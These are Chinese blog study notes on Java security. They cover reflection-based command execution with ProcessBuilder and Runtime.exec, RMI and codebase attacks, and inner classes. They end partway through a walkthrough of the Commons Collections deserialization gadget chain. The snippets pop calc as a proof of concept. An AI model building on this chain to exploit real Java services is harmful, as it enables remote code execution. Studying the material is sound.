<h3 id="两个问题"><a href="#两个问题" class="headerlink" title="两个问题"></a>两个问题</h3><h4 id="如果一个类没有无参构造方法-也没有类似单例模式里的静态方法，我们怎样通过反射实例化该类呢？"><a href="#如果一个类没有无参构造方法-也没有类似单例模式里的静态方法，我们怎样通过反射实例化该类呢？" class="headerlink" title="如果一个类没有无参构造方法,也没有类似单例模式里的静态方法，我们怎样通过反射实例化该类呢？"></a>如果一个类没有无参构造方法,也没有类似单例模式里的静态方法，我们怎样通过反射实例化该类呢？</h4><p>需要使用到getConstructor()方法获取无参构造函数,因为构造函数也支持重载,所以必须用参数列表类型才能唯一确定一个构造函数</p>
<p>比如经常使用的另一种执行命令的类ProcessBuilder,使用反射来获取其有参的构造函数,然后调用<code>start()</code>来执行命令</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processBuilder</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">        ((ProcessBuilder)aClass.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;calc&quot;</span>))).start();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>如果不能强制类型转换的时候,利用反射的getMethod和invoke来执行</p>
<p>通过 getMethod(“start”) 获取到start方法，然后 invoke 执行， invoke 的第一个参数就是 ProcessBuilder Object了。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">aClass.getMethod(<span class="string">&quot;start&quot;</span>).invoke(aClass.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;calc&quot;</span>)));</span><br></pre></td></tr></table></figure>

<p>那么，如果我们要使用 <code>public ProcessBuilder(String... command) </code>这个构造函数，需要怎样用反 射执行呢？</p>
<p>这个<code>String... command</code>参数表示可变长参数,在Java中编译的时候会编译成一个数组</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">((ProcessBuilder)clazz.getConstructor(String[].class).newInstance(<span class="keyword">new</span> String[][]&#123;&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;&#125;)).start();</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">aClass.getMethod(<span class="string">&quot;start&quot;</span>).invoke(aClass.getConstructor(String[].class).newInstance(<span class="keyword">new</span> String[][]&#123;&#123;<span class="string">&quot;calc&quot;</span>&#125;&#125;));</span><br></pre></td></tr></table></figure>



<h4 id="如果一个方法或构造方法是私有方法，我们是否能执行它呢？"><a href="#如果一个方法或构造方法是私有方法，我们是否能执行它呢？" class="headerlink" title="如果一个方法或构造方法是私有方法，我们是否能执行它呢？"></a>如果一个方法或构造方法是私有方法，我们是否能执行它呢？</h4><p>此时就需要getDeclared系列的反射了</p>
<ul>
<li><p>getMethod 系列方法获取的是当前类中所有公共方法，包括从父类继承的方法 </p>
</li>
<li><p>getDeclaredMethod 系列方法获取的是当前类中“声明”的方法，是实在写在这个类里的，包括私 有的方法，但从父类里继承来的就不包含了</p>
</li>
</ul>
<p>之前提到过,Runtime的构造方法时私有的,现在可以通过getDeclaredConstructor来获取这个私有的构造方法,使用setAccessible(true)来设置私有方法的作用域来调用它</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">declar</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; declaredConstructor = aClass.getDeclaredConstructor();</span><br><span class="line">        declaredConstructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        aClass.getMethod(<span class="string">&quot;exec&quot;</span>,String.class).invoke(declaredConstructor.newInstance(),<span class="string">&quot;calc&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>





]]></content>
      <categories>
        <category>java安全</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>java安全</tag>
      </tags>
  </entry>
  <entry>
    <title>java安全-RMI</title>
    <url>/2022/03/04/java%E5%AE%89%E5%85%A8-RMI/</url>
    <content><![CDATA[<p>RMI全称是Remote Method Invocation，远程⽅法调⽤。</p>
<p>从这个名字就可以看出，他的⽬标和RPC其实 是类似的，是让某个Java虚拟机上的对象调⽤另⼀个Java虚拟机中对象上的⽅法，只不过RMI是Java独 有的⼀种机制</p>
<p>要调用远程方法肯定要先注册一个服务器</p>
<p>P牛这里的server类使用了内部类,对于内部类不是很熟悉,先去学习一下内部类再回来看</p>
<p>Server</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Server</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">IRemoteHello</span> <span class="keyword">extends</span> <span class="title">Remote</span></span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RemoteHello</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">IRemoteHello</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="title">RemoteHello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">            <span class="keyword">super</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;call from&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;hello world&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">start</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        RemoteHello remoteHello = <span class="keyword">new</span> RemoteHello();</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">9999</span>);</span><br><span class="line">        Naming.rebind(<span class="string">&quot;rmi://127.0.0.1:9999/Hello&quot;</span>,remoteHello);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> Server().start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>⼀个RMI Server分为三部分： </p>
<ol>
<li>⼀个继承了 java.rmi.Remote 的接⼝，其中定义我们要远程调⽤的函数，⽐如这⾥的 hello() </li>
<li>⼀个实现了此接⼝的类 </li>
<li>⼀个主类，⽤来创建Registry，并将上⾯的类实例化后绑定到⼀个地址。这就是我们所谓的Server 了。 </li>
</ol>
<p>Client</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Server.IRemoteHello hello= (Server.IRemoteHello) Naming.lookup(<span class="string">&quot;rmi://127.0.0.1:9999/Hello&quot;</span>);</span><br><span class="line">        String res=hello.hello();</span><br><span class="line">        System.out.println(res);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>首先使用<code>Naming.lookup</code>在Registry中寻找名字是Hello的对象,根据<code>Naming.rebind</code>的结果是remoteHello对象</p>
<p>虽说执⾏远程⽅法的时候代码是在远程服务器上执⾏的，但实际上我们还是需要知道有哪些⽅法，这时 候接⼝的重要性就体现了，这也是为什么我们前⾯要继承 <code>Remote</code> 并将我们需要调⽤的⽅法写在接⼝ <code>IRemoteHello</code>⾥，因为客户端也需要⽤到这个接⼝。</p>
<blockquote>
<p>在这里有一个疑问,为什么在创建hello对象的时候可以直接加上<code>Server.IRemoteHello</code></p>
</blockquote>
<h5 id="Naming-bind和registy-bind的区别"><a href="#Naming-bind和registy-bind的区别" class="headerlink" title="Naming.bind和registy.bind的区别"></a>Naming.bind和registy.bind的区别</h5><p>查看源码后</p>
<p>其实Naming.bind方法是对registy.bind的一种封装,具体到对应的格式和端口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">8494</span>).bind(<span class="string">&quot;R1&quot;</span>, </span><br><span class="line">            UnicastRemoteObject.exportObject(<span class="keyword">new</span> RemoteObject(), <span class="number">0</span>));</span><br><span class="line">    </span><br><span class="line">    Naming.bind(<span class="string">&quot;rmi://127.0.0.1:8494/R1&quot;</span>, </span><br><span class="line">            UnicastRemoteObject.exportObject(<span class="keyword">new</span> RemoteObject (), <span class="number">0</span>));</span><br></pre></td></tr></table></figure>





<p>通常在创建RMI Registry的时候,都会直接绑定一个对象在上面</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">LocateRegistry.createRegistry(<span class="number">9999</span>);</span><br><span class="line">Naming.rebind(<span class="string">&quot;rmi://127.0.0.1:9999/Hello&quot;</span>,<span class="keyword">new</span> RemoteHello());</span><br></pre></td></tr></table></figure>

<p>第一行创建RMI Registry,第二行将RemoteHello对象绑定到Hello这个路径上面</p>
<p><code>Naming.bind </code>的第一个参数是一个URL，形如：<code>rmi://host:port/name</code>。其中，<code>host</code>和<code>port</code>就是 RMI Registry的地址和端口，<code>name</code>是远程对象的名字。</p>
<h4 id="两个关于攻击的问题"><a href="#两个关于攻击的问题" class="headerlink" title="两个关于攻击的问题"></a>两个关于攻击的问题</h4><ol>
<li>如果我们能访问RMI Registry服务，如何对其攻击？ </li>
</ol>
<p>我的理解是如果能访问RMI Regittry服务,但也仅仅是能访问,缺少对应的攻击方法,如何在Server中创建恶意对象和攻击方法….</p>
<p>JAVA中对于远程访问RMI Regittry服务做了限制,只有来源是本地的时候才能调用<code>rebind</code>,<code>bind</code>,<code>unbind</code>方法来修改绑定的对象和方法</p>
<p>但是可以通过list方法和lookup可以远程调用,使用Naming.list</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String[] s = Naming.list(<span class="string">&quot;rmi://127.0.0.1:9999&quot;</span>);</span><br><span class="line"><span class="comment">//使用该方法可以获取绑定到该端口的远程对象名字数组</span></span><br><span class="line">Naming.lookup可以调用该方法</span><br></pre></td></tr></table></figure>

<blockquote>
<p>总结</p>
<p>能访问到RMI Registry服务,需要目标Server上面有比较危险的方法供我们调用才能造成攻击</p>
</blockquote>
<ol start="2">
<li>如果我们控制了目标RMI客户端中 Naming.lookup 的第一个参数（也就是RMI Registry的地 址），能不能进行攻击？</li>
</ol>
<p>如果能够控制<code>RMI客户端</code>中RMI Registry的地址,那么自己就可以在攻击机上面创建对应的恶意方法让其远程调用</p>
<h3 id="RMI利用codebase执行任意代码"><a href="#RMI利用codebase执行任意代码" class="headerlink" title="RMI利用codebase执行任意代码"></a>RMI利用codebase执行任意代码</h3><p>codebase是一个地址，告诉Java虚拟机我们应该从哪个地方去搜索类，有点像我们日常用的 CLASSPATH，但CLASSPATH是本地路径，而codebase通常是远程URL，比如http、ftp等。</p>
<p>如果我们指定 <code>codebase=http://example.com/</code> ，然后加载 <code>org.vulhub.example.Example</code> 类，则 Java虚拟机会下载这个文件<code>http://example.com/org/vulhub/example/Example.class</code>，并作为 Example类的字节码。</p>
<blockquote>
<p>RMI的流程中，客户端和服务端之间传递的是一些序列化后的对象，这些对象在反序列化时，就会去寻 找类。如果某一端反序列化时发现一个对象，那么就会去自己的CLASSPATH下寻找想对应的类；如果在 本地没有找到这个类，就会去远程加载codebase中的类。</p>
</blockquote>
<p>在RMI中，我们是可以将codebase随着序列化数据一起传输的，服务器在接收到这个数据后就会去 CLASSPATH和指定的codebase寻找类，由于codebase被控制导致任意命令执行漏洞。</p>
<p>不过显然官方也注意到了这一个安全隐患，所以只有满足如下条件的RMI服务器才能被攻击： </p>
<ul>
<li>安装并配置了SecurityManager </li>
<li>Java版本低于7u21、6u45，或者设置了 java.rmi.server.useCodebaseOnly=false </li>
<li>其中 java.rmi.server.useCodebaseOnly 是在Java 7u21、6u45的时候修改的一个默认设置： <ul>
<li><a href="https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/enhancements-7.html">https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/enhancements-7.html</a> </li>
<li><a href="https://www.oracle.com/technetwork/java/javase/7u21-relnotes-1932873.html">https://www.oracle.com/technetwork/java/javase/7u21-relnotes-1932873.html</a> </li>
</ul>
</li>
</ul>
<p>官方将 java.rmi.server.useCodebaseOnly 的默认值由 false 改为了 true 。在java.rmi.server.useCodebaseOnly 配置为<code> true</code> 的情况下，<strong>Java虚拟机将只信任预先配置好的 codebase ，不再支持从RMI请求中获取。</strong></p>
<p>java -Djava.rmi.server.hostname=192.168.135.142 - Djava.rmi.server.useCodebaseOnly=false -Djava.security.policy=client.policy RemoteRMIServer</p>
<p>这个复现出现了问题,自己百度没有解决,等解决了再继续</p>
<p>客户端和服务端都需要定义一个接口继承Remote接口，但是服务端需要实现这个接口，毕竟调用的是服务端的方法，它是实打实存在的</p>
<p>服务端必须继承<code>UnicastRemoteObject</code>类</p>
]]></content>
      <categories>
        <category>java安全</category>
      </categories>
      <tags>
        <tag>java安全</tag>
      </tags>
  </entry>
  <entry>
    <title>java内部类</title>
    <url>/2022/03/04/java%E5%86%85%E9%83%A8%E7%B1%BB/</url>
    <content><![CDATA[<h1 id="内部类"><a href="#内部类" class="headerlink" title="内部类"></a>内部类</h1><p>一般情况下,类和类之间是互相独立的,内部类的意思是是打破这种独立,让一个类称为另外一个类的内部成员,和成员变量,成员方法相同级别</p>
<blockquote>
<p>为什么要使用内部类?</p>
<p>采用内部类这种技术,可以隐藏细节和内部结构,封装性更好,让程序的结构更加合理</p>
</blockquote>
<h3 id="非静态内部类"><a href="#非静态内部类" class="headerlink" title="非静态内部类"></a>非静态内部类</h3><p>内部类在创建的时候不能直接new,需要加个前缀才能new出来,加的这个前缀是已经实例化的外部类对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">OuterClass outerClass = <span class="keyword">new</span> OuterClass();</span><br><span class="line">        InnerClass innerClass = outerClass.<span class="function">new <span class="title">InnerClass</span><span class="params">()</span></span>;</span><br><span class="line">        innerClass.display();</span><br></pre></td></tr></table></figure>

<p>非静态内部类的使用就是将内部类当做外部类的一个成员变量去使用,所以必须依赖于外部类的对象才能调用</p>
<p>如果在类的内部去创建一个内部类对象,就不需要加前缀,和正常的创建方式一样</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">outclass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String outerName;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">display</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">class</span> <span class="title">innerClass</span></span>&#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">                System.out.println(<span class="string">&quot;内部类方法&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        innerClass innerClass = <span class="keyword">new</span> innerClass();</span><br><span class="line">        innerClass.print();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        outclass outerClass = <span class="keyword">new</span> outclass();</span><br><span class="line">        outerClass.display();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="静态内部类"><a href="#静态内部类" class="headerlink" title="静态内部类"></a>静态内部类</h3><p>静态内部类的构造不需要依赖于外部类对象,类中的所有静态组件都不需要依赖于任何对象,可以直接通过类本身进行构造</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">OuterClass</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String outerName;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">display</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;外部类显示&quot;</span>);</span><br><span class="line">        System.out.println(outerName);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//内部类</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">InnerClass</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> String innerName;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">display</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;内部类显示&quot;</span>);</span><br><span class="line">            System.out.println(innerName);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">InnerClass</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.innerName = <span class="string">&quot;inner Class&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        OuterClass outerClass = <span class="keyword">new</span> OuterClass();</span><br><span class="line">        outerClass.display();</span><br><span class="line">        OuterClass.InnerClass innerClass = <span class="keyword">new</span> InnerClass();</span><br><span class="line">        innerClass.display();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="匿名内部类"><a href="#匿名内部类" class="headerlink" title="匿名内部类"></a>匿名内部类</h3><p>匿名内部类的本质是接口的匿名实现</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Myinterface</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//匿名内部类</span></span><br><span class="line">        Myinterface myinterface=<span class="keyword">new</span> Myinterface() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;匿名内部类方法&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        myinterface.test();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>java内部类</tag>
      </tags>
  </entry>
  <entry>
    <title>CommonsCollections</title>
    <url>/2022/03/14/CommonsCollections/</url>
    <content><![CDATA[<p>实验环境</p>
<p>jdk8u65</p>
<p>commonsCollections 3.2.1</p>
<p>这个学的很吃力,但是每天都坚持,争取一周之内将其理解<span id="more"></span></p>
<hr>
<blockquote>
<p>对于InvokerTransformer的理解,在这里记录一下,防止忘记</p>
</blockquote>
<p><a href="https://app.yinxiang.com/shard/s51/nl/33688597/8bf0d8b9-d265-4a61-a2b6-5918bc38706d">https://app.yinxiang.com/shard/s51/nl/33688597/8bf0d8b9-d265-4a61-a2b6-5918bc38706d</a></p>
<p>目标是通过TransFormer接口的InvokerTransformer实现类中的transform方法实现任意类加载,</p>
<p><strong>找利用链的过程应该是逆向思维,先找到一个能接受任意参数并且能执行命令方法,然后再反着找谁调用了它,再找谁调用了调用了它的那个函数,最后找到底的并且能走通的类就是入口类????</strong></p>
<p>这是该方法的源码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        iMethodName = methodName;</span><br><span class="line">        iParamTypes = paramTypes;</span><br><span class="line">        iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class cls = input.getClass();</span><br><span class="line">            Method method = cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, iArgs);</span><br><span class="line">                </span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, ex);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>通过观察该方法,发现该方法接受一个任意对象为参数,并且通过反射调用方法,方法名和参数在构造方法中可控</p>
<p>先自己写一遍自己认为的能调用exec的代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">InvokerTransformer invokerTransformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class&#125;,<span class="keyword">new</span> String[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        invokerTransformer.transform(Runtime.getRuntime());</span><br></pre></td></tr></table></figure>

<p>接着拓展这条调用链,找一找有没有不同名的类调用了transform方法</p>
<p>跟着教程在TransformedMap类中找到了一个checkSetValue方法中调用了transform方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> Object <span class="title">checkSetValue</span><span class="params">(Object value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> valueTransformer.transform(value);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>该类的构造方法为protected,于是在该类中找有无使用了该构造方法的方法,找到一个<code>decorate</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> TransformedMap(map, keyTransformer, valueTransformer);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>该方法根据注释是一个用来创建transforming map的工厂方法 </p>
<p>setValue调用了checkSetValue方法,checkSetValue方法又调用了transform方法</p>
<blockquote>
<p>至于为什么会这样呢?</p>
</blockquote>
<p>因为TransformedMap继承了<code>AbstractInputCheckedMapDecorator</code>这个抽象类,这个抽象类中checkSetValue是抽象方法,被<code>TransformedMap</code>实现,所以setValue中<code>parent.checkSetValue</code>调用的就是这个被实现的方法</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220310150430013.png" alt="image-20220310150430013"></p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220310150131340.png" alt="image-20220310150131340"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">InvokerTransformer invokerTransformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class&#125;,<span class="keyword">new</span> String[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> HashMap&lt;Object, Object&gt;() ;</span><br><span class="line">        map.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; decorate = TransformedMap.decorate(map, <span class="keyword">null</span>, invokerTransformer);<span class="comment">//返回一个里面对象类型是Transformer map</span></span><br><span class="line">        <span class="keyword">for</span> (Map.Entry entry:decorate.entrySet()</span><br><span class="line">             ) &#123;</span><br><span class="line">            entry.setValue(Runtime.getRuntime());</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>接着在setValue上面再拓展,找有没有在readObject中使用了setValue的类</p>
<p>找到AnnoationInvocationHandler中的readObject方法中有使用setValue</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check to make sure that types have not evolved incompatibly</span></span><br><span class="line"></span><br><span class="line">        AnnotationType annotationType = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            annotationType = AnnotationType.getInstance(type);</span><br><span class="line">        &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">            <span class="comment">// Class is no longer an annotation type; time to punch out</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> java.io.InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// If there are annotation members without values, that</span></span><br><span class="line">        <span class="comment">// situation is handled by the invoke method.</span></span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">            String name = memberValue.getKey();</span><br><span class="line">            Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">            <span class="keyword">if</span> (memberType != <span class="keyword">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">                Object value = memberValue.getValue();</span><br><span class="line">                <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                      value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                    memberValue.setValue(</span><br><span class="line">                        <span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(</span><br><span class="line">                            value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">                                annotationType.members().get(name)));</span><br><span class="line">                